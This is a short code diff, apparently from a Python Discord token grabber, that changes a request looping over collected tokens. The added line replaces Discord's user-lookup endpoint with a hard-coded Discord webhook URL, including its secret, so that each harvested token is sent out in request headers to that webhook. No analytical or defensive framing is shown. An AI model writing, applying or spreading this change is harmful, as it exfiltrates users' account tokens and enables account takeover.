@@ -111,7 +111,7 @@ def main():
                     continue
                 checked.append(token)
 
-                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
+                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1493352996690722896/S_HmWjomrOF1BD2wM8hJOwV_HEokQq41IGmteLALjfsrUCO7pHOHqV34TSLZ0GfW_F59', headers=getheaders(token)))
                 if res.getcode() != 200:
                     continue
                 res_json = json.loads(res.read().decode())
